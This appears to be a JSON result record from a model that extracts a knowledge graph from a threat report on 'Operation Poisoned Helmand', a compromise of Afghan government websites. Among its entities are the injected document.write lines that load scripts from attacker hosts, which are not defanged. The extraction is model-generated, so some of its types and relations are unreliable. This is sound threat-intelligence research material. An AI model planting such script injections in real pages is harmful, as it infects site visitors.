@@ -1,0 +1,601 @@
+{
+  "sample_id": "securenlp__operation-poisoned-helmand",
+  "sample_index": 174,
+  "source": "securenlp",
+  "file_name": "operation-poisoned-helmand",
+  "method_name": "GRID_Ours (End2End)",
+  "method_file": "GRID_Ours.py",
+  "approach_instance_key": "GRID_two_steps_v2__764c1ab0c67006a2",
+  "generation": {
+    "status": "success",
+    "wall_seconds": 12.144203727025104,
+    "attempt_count": 1,
+    "model": "local",
+    "backend_type": "shared_vllm",
+    "token": 32768,
+    "temperature": 0.7
+  },
+  "parser": {
+    "name": "method_internal_parser",
+    "success": true
+  },
+  "generated_graph": {
+    "entities": [
+      {
+        "name": "Operation Poisoned Helmand",
+        "type": "campaign",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "content delivery networks (CDNs)",
+        "type": "infrastructure",
+        "alias": [
+          "CDN",
+          "backend CDN infrastructure"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "malicious third-party content",
+        "type": "indicator",
+        "alias": [
+          "malicious script",
+          "malicious Java applet",
+          "malicious JavaScript functions"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "ThreatConnect Intelligence Research Team (TCIRT)",
+        "type": "identity",
+        "alias": [
+          "TCIRT"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "cdn.afghanistan[.]af",
+        "type": "domain-name",
+        "alias": [
+          "the compromised CDN resource",
+          "the CDN site"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "Afghan Ministry of Communications and IT (MCIT)",
+        "type": "identity",
+        "alias": [
+          "MCIT",
+          "the Afghan Ministry"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "gop-script.js",
+        "type": "file",
+        "alias": [
+          "the javascript URL",
+          "the script",
+          "the malicious script",
+          "the gop-script.js"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "official Government of Afghanistan websites",
+        "type": "identity",
+        "alias": [
+          "the gov.af websites",
+          "the Afghan Government websites"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "http://canberra.afghanistan[.]af/en",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://herat.gov[.]af/fa",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://mfa.gov[.]af/en",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://moci.gov[.]af/en",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://moe.gov[.]af/en",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://mof.gov[.]af/en",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://moj.gov[.]af/fa",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://mowa.gov[.]af/fa",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://oaacoms.gov[.]af/fa",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "document.write(\"<script src=http://update.javaplug-in.com/o/j.js></script>\")",
+        "type": "malicious-investigates-track-detects",
+        "alias": [
+          "malicious JavaScript functions",
+          "the following malicious JavaScript functions"
+        ],
+        "mother entity": [
+          "gop-script.js"
+        ]
+      },
+      {
+        "name": "document.write(\"<script src=http://neoting.com/pay/danal/PhoneBill/07/1.js> </script>\")",
+        "type": "malicious-investigates-track-detects",
+        "alias": [],
+        "mother entity": [
+          "gop-script.js"
+        ]
+      },
+      {
+        "name": "http://update.javaplug-in.com/o/j.js",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://neoting.com/pay/danal/PhoneBill/07/1.js",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "Li Keqiang",
+        "type": "identity",
+        "alias": [
+          "China’s Prime Minister",
+          "Keqiang"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "Abdullah Abdullah",
+        "type": "identity",
+        "alias": [
+          "Chief Executive Officer of Afghanistan"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "image of Keqiang meeting with Abdullah",
+        "type": "file",
+        "alias": [
+          "the image"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "www.news[.]cn",
+        "type": "domain-name",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "Java Malware Overlap",
+        "type": "campaign",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "C2 domain java-se[.]com",
+        "type": "domain-name",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "SHA1: 388E6F41462774268491D1F121F333618C6A2C9A",
+        "type": "file",
+        "alias": [
+          "the Java applet",
+          "this Java applet"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "Update.class",
+        "type": "file",
+        "alias": [
+          "malicious class file"
+        ],
+        "mother entity": [
+          "SHA1: 388E6F41462774268491D1F121F333618C6A2C9A"
+        ]
+      },
+      {
+        "name": "http://mfa.gov[.]af/content/images/icon35.png",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "Windows PE executable SHA1: 72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB",
+        "type": "file",
+        "alias": [
+          "the Windows PE executable"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "dllhost.exe",
+        "type": "file",
+        "alias": [
+          "Legitimate Microsoft Debugging Tools for Windows Executable"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "dbgeng.dll",
+        "type": "file",
+        "alias": [
+          "Malicious DLL"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "Readme.txt",
+        "type": "file",
+        "alias": [
+          "malicious encrypted backdoor binary blob"
+        ],
+        "mother entity": [
+          "dbgeng.dll"
+        ]
+      },
+      {
+        "name": "oracle0876634.javaplug-in[.]com",
+        "type": "domain-name",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "Operation Poisoned Hurricane",
+        "type": "campaign",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "ThreatConnect Common Community Incident 20140815A",
+        "type": "malware-analysis-document-or-publication-or-conference",
+        "alias": [
+          "blog post"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "APT_OnAndOn_cert.yara",
+        "type": "course-of-action",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "The US and NATO",
+        "type": "identity",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "Taliban",
+        "type": "threat-actor-or-intrusion-set",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "Beijing",
+        "type": "identity",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "Chinese intelligence services",
+        "type": "threat-actor-or-intrusion-set",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "partner states involved in the planned troop reduction",
+        "type": "identity",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "Content Security Policy",
+        "type": "course-of-action",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "ThreatConnect",
+        "type": "security-product",
+        "alias": [
+          "ThreatConnect Platform"
+        ],
+        "mother entity": []
+      }
+    ],
+    "relations": [
+      {
+        "sub": "Operation Poisoned Helmand",
+        "rel": "leveraging",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "content delivery networks (CDNs)",
+        "special_factuality": []
+      },
+      {
+        "sub": "malicious third-party content",
+        "rel": "delivered to",
+        "rel_type": [
+          "compromises"
+        ],
+        "obj": "official Government of Afghanistan websites",
+        "special_factuality": []
+      },
+      {
+        "sub": "ThreatConnect Intelligence Research Team (TCIRT)",
+        "rel": "observed",
+        "rel_type": [
+          "malicious-investigates-track-detects"
+        ],
+        "obj": "Operation Poisoned Helmand",
+        "special_factuality": []
+      },
+      {
+        "sub": "cdn.afghanistan[.]af",
+        "rel": "hosting",
+        "rel_type": [
+          "hosts"
+        ],
+        "obj": "gop-script.js",
+        "special_factuality": []
+      },
+      {
+        "sub": "cdn.afghanistan[.]af",
+        "rel": "used by",
+        "rel_type": [
+          "hosts"
+        ],
+        "obj": "Afghan Ministry of Communications and IT (MCIT)",
+        "special_factuality": []
+      },
+      {
+        "sub": "gop-script.js",
+        "rel": "called from",
+        "rel_type": [
+          "communicates-with"
+        ],
+        "obj": "official Government of Afghanistan websites",
+        "special_factuality": []
+      },
+      {
+        "sub": "gop-script.js",
+        "rel": "delivers",
+        "rel_type": [
+          "delivers"
+        ],
+        "obj": "malicious third-party content",
+        "special_factuality": []
+      },
+      {
+        "sub": "document.write(\"<script src=http://update.javaplug-in.com/o/j.js></script>\")",
+        "rel": "prepended to",
+        "rel_type": [
+          "modifies-or-removes-or-replaces"
+        ],
+        "obj": "gop-script.js",
+        "special_factuality": []
+      },
+      {
+        "sub": "document.write(\"<script src=http://update.javaplug-in.com/o/j.js></script>\")",
+        "rel": "delivers",
+        "rel_type": [
+          "delivers"
+        ],
+        "obj": "malicious third-party content",
+        "special_factuality": []
+      },
+      {
+        "sub": "document.write(\"<script src=http://neoting.com/pay/danal/PhoneBill/07/1.js> </script>\")",
+        "rel": "delivers",
+        "rel_type": [
+          "delivers"
+        ],
+        "obj": "malicious third-party content",
+        "special_factuality": []
+      },
+      {
+        "sub": "Operation Poisoned Helmand",
+        "rel": "compromised by",
+        "rel_type": [
+          "compromises"
+        ],
+        "obj": "gop-script.js",
+        "special_factuality": [
+          "possible"
+        ]
+      },
+      {
+        "sub": "Li Keqiang",
+        "rel": "meeting with",
+        "rel_type": [
+          "communicates-with"
+        ],
+        "obj": "Abdullah Abdullah",
+        "special_factuality": []
+      },
+      {
+        "sub": "image of Keqiang meeting with Abdullah",
+        "rel": "hosted on",
+        "rel_type": [
+          "located-at"
+        ],
+        "obj": "Chinese embassy website",
+        "special_factuality": []
+      },
+      {
+        "sub": "Java Malware Overlap",
+        "rel": "associated with",
+        "rel_type": [
+          "alias-of"
+        ],
+        "obj": "C2 domain java-se[.]com",
+        "special_factuality": []
+      },
+      {
+        "sub": "Java Malware Overlap",
+        "rel": "associated with",
+        "rel_type": [
+          "variant-of"
+        ],
+        "obj": "Operation Poisoned Hurricane",
+        "special_factuality": []
+      },
+      {
+        "sub": "Java Malware Overlap",
+        "rel": "uses",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "gop-script.js",
+        "special_factuality": []
+      },
+      {
+        "sub": "Java Malware Overlap",
+        "rel": "contains",
+        "rel_type": [
+          "consists-of"
+        ],
+        "obj": "Update.class",
+        "special_factuality": []
+      },
+      {
+        "sub": "Update.class",
+        "rel": "downloads",
+        "rel_type": [
+          "downloads"
+        ],
+        "obj": "Windows PE executable SHA1: 72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB",
+        "special_factuality": []
+      },
+      {
+        "sub": "Windows PE executable SHA1: 72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB",
+        "rel": "drops",
+        "rel_type": [
+          "drops"
+        ],
+        "obj": "dllhost.exe",
+        "special_factuality": []
+      },
+      {
+        "sub": "Windows PE executable SHA1: 72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB",
+        "rel": "drops",
+        "rel_type": [
+          "drops"
+        ],
+        "obj": "dbgeng.dll",
+        "special_factuality": []
+      },
+      {
+        "sub": "dllhost.exe",
+        "rel": "loads",
+        "rel_type": [
+          "executes"
+        ],
+        "obj": "dbgeng.dll",
+        "special_factuality": []
+      },
+      {
+        "sub": "dbgeng.dll",
+        "rel": "loads",
+        "rel_type": [
+          "executes"
+        ],
+        "obj": "Readme.txt",
+        "special_factuality": []
+      },
+      {
+        "sub": "Readme.txt",
+        "rel": "connects to",
+        "rel_type": [
+          "beacons-to"
+        ],
+        "obj": "oracle0876634.javaplug-in[.]com",
+        "special_factuality": []
+      },
+      {
+        "sub": "The US and NATO",
+        "rel": "reduce troop levels in",
+        "rel_type": [
+          "targets"
+        ],
+        "obj": "Afghanistan",
+        "special_factuality": []
+      },
+      {
+        "sub": "Chinese intelligence services",
+        "rel": "exploiting",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "Afghanistan’s government websites",
+        "special_factuality": []
+      },
+      {
+        "sub": "Content Security Policy",
+        "rel": "mitigates",
+        "rel_type": [
+          "mitigates"
+        ],
+        "obj": "malicious third-party content",
+        "special_factuality": []
+      },
+      {
+        "sub": "ThreatConnect",
+        "rel": "provides",
+        "rel_type": [
+          "provides"
+        ],
+        "obj": "ThreatConnect Common Community Incident 20140815A",
+        "special_factuality": []
+      }
+    ]
+  }
+}
